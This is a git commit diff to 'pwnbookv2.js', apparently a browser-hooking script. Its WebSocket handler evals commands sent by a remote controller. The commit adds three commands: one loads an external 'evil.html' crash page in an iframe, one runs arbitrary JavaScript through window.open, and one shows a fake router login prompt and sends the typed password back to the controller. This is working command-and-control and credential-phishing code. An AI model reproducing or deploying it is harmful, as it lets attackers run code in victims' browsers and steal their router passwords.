6cfaecf7a2d8003b68c10b9c767aa5805d120634
AustinJackS <austinjack404@gmail.com>
2017-05-20 17:57:39 -0400

    Update pwnbookv2.js

--- pwnbookv2.js
+++ pwnbookv2.js
@@ -15,4 +15,18 @@ ws.onmessage = function (event) {
      eval(data.substr(3, data.length));
      ws.send('rsp:Executed!')
   }
+  if(data=="CRASH") {
+    x=document.createElement('iframe');
+    x.src="https://austinjacks.github.io/crashtests/evil.html"
+    document.body.append(x);
+  }
+  if(data.substr(0, 5)=="agent") {
+    y=window.open("javascript:"+data.substr(6, data.length)+";void 0");
+    y.close();  
+    ws.send('rsp:Executed!')
+  }
+  if(data=="router-auth") {
+    z=prompt("192.168.1.1\n\nPlease authenticate with the router.\nPassword:")
+    ws.send('rsp:Password='+z);
+  }
 }
